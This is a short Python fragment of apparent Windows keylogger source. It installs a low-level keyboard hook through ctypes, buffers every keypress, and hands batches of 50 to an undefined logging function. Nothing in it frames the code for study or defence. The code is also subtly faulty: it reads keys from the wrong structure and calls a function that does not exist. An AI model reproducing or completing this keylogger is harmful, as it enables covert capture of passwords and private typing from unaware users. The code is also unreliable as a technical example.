import ctypes
from ctypes import wintypes

def run_win_logger(stop_event):
    user32 = ctypes.windll.user32
    buffer = []
    def hook_proc(nCode, wParam, lParam):
        if stop_event.is_set(): return -1
        if nCode == 0 and wParam == 256:
            kbd = ctypes.cast(lParam, ctypes.POINTER(wintypes.MSG))
            key = chr(kbd.contents.message)
            buffer.append(key)
            if len(buffer) > 50: finalize_log("".join(buffer)); buffer.clear() # type: ignore
        return user32.CallNextHookEx(None, nCode, wParam, lParam)
    
    callback = ctypes.CFUNCTYPE(wintypes.HRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)(hook_proc)
    user32.SetWindowsHookExA(13, callback, None, 0)
    user32.GetMessageA(None, None, 0, 0)
